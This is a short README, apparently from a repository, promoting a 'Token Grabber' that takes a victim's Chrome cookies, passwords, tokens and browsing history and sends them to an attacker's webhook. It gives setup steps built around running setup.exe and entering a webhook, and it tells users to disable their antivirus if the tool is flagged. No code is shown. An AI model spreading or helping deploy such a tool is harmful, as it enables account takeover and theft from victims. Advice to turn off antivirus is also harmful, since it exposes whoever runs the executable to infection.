# Token Grabber
This is a simple chrome cookie grabber. When your victim clicks on a link their cookies, passwords, tokens, browser history, and more.
They are allsent to a webhook. It also comes with a download link.

# Download

It shouldn't be flagged by your antivirus but if it is just disable it.

# Instructions

How to use 
1. Run setup.exe
2. Put in the name of your grabber.
3. Put in the webhook from the channel you want to receive cookies from.
4. **If setup.exe takes longer than 30 seconds, go to help/BackupSetup.exe and run that**
5. That is the simplified version and it should load quicker but you won't get as many features.

Check your files in the same directory for a python script that you can convert to exe.
